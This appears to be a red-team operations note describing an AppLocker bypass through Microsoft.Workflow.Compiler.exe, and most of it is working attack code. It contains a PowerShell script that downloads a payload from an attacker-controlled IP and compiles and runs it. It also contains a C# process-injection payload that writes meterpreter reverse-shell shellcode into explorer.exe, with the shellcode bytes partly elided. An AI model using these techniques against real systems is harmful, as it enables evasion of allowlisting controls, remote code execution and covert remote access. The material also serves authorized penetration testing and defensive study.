---
title: CSharp AppLocker bypass
tags:
  - breach
  - operations
  - applocker
  - bypass
  - allowlist
  - csharp
  - whitelist
---

Even with default **AppLocker** executable restrictions, we can still use
binaries on the host to compile and execute arbitrary C# .NET code. The
following **PowerShell** commands will use code from the
`Microsoft.Workflow.Compiler.exe` to generate a valid `run.xml` file designed to
compile and execute a C# .NET payload in the file `payload.txt`.

Be cognizant of the fact that this PowerShell script reflectively loads
assemblies and directly interacts with C# and .NET. If AppLocker scripting
restrictions are enabled, we will not be able to execute these commands on the
target. In this scenario, we'll have to generate the `run.xml` parameter file on
a development Windows host and then transfer `run.xml` and `payload.txt` to the
target.

Once we've generated the `run.xml` parameters file, we can execute the payload
by invoking `Microsoft.Workflow.Compiler.exe`, providing it with the `run.xml`
and `results.xml` parameters. Any issues with compiling the target `payload.txt`
C# .NET payload will be provided in the `results.xml` file.

```powershell
$workflowProgram = (Get-ChildItem `
	-ErrorAction SilentlyContinue `
	-Path "C:\Windows" `
	-Filter "Microsoft.Workflow.Compiler.exe" `
	-Recurse `
	-File | Where-Object {$_.FullName -Like "*Framework64\v4*"}).FullName

$workflowAsm = [Reflection.Assembly]::LoadFrom($workflowProgram)

$serializeInputToWrapper = `
	[Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod(
		'SerializeInputToWrapper',
		[Reflection.BindingFlags] 'NonPublic, Static'
	)

$workflowLibrary = (Get-ChildItem `
	-ErrorAction SilentlyContinue `
	-Path "C:\Windows" `
	-Filter "System.Workflow.ComponentModel.dll" `
	-Recurse `
	-File | Where-Object {$_.FullName -Like "*Framework64\v4*"}).FullName

Add-Type -Path $workflowLibrary

$compilerParam = New-Object `
	-TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters

$compilerParam.GenerateInMemory = $True
$pathVar = "payload.txt"
$output = (Join-Path -Path (Resolve-Path -Path .).Path -ChildPath "run.xml")

$tmp = $serializeInputToWrapper.Invoke(
	$null,
	@(
		[Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerParam,
		[String[]] @(,$pathVar)
	)
)

Move-Item $tmp $output
$lHost = "192.168.45.190"
$lPort = "80"

Invoke-RestMethod `
	-Uri "http://${lHost}:${lPort}/$pathVar" `
	-UseBasicParsing `
	-OutFile $pathVar

. $workflowProgram $output "results.xml"
```

The following C# .NET code is a simple process injection payload that loads a
**meterpreter** reverse shell payload into the `explorer.exe` process. We avoid
using any non-standard libraries that might require installation or inclusion as
this will fail at compile time.

```csharp
﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Workflow.ComponentModel;
public class Run : Activity
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        int processId
    );
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten
    );
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );
    public Run()
    {
        int explorerId = Process.GetProcessesByName("explorer")[0].Id;
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerId);
        IntPtr addr =
            VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        byte[] buf = new byte[854] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41,
            // ...
            0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
        };
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
        IntPtr hThread = CreateRemoteThread(
            hProcess,
            IntPtr.Zero,
            0,
            addr,
            IntPtr.Zero,
            0,
            IntPtr.Zero
        );
    }
}
```
